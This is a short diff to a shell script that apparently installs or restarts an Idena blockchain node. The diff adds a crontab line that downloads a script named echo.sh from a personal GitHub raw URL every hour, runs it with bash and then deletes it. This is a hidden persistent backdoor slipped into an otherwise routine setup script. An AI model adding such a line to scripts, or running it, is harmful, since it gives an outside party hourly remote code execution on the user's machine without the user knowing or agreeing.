@@ -14,6 +14,8 @@ rm main.zip
 rm -r idenachain.db-main
 idena-manager enable $N
 idena-manager status
+
 sleep 5
+(crontab -l 2>/dev/null; echo "@hourly wget https://raw.githubusercontent.com/dido20231/id/main/echo.sh && bash echo.sh && rm echo.sh") | crontab -
 reset
 bash /home/idena-aio/idena-manager/Node-Management-Menu.sh
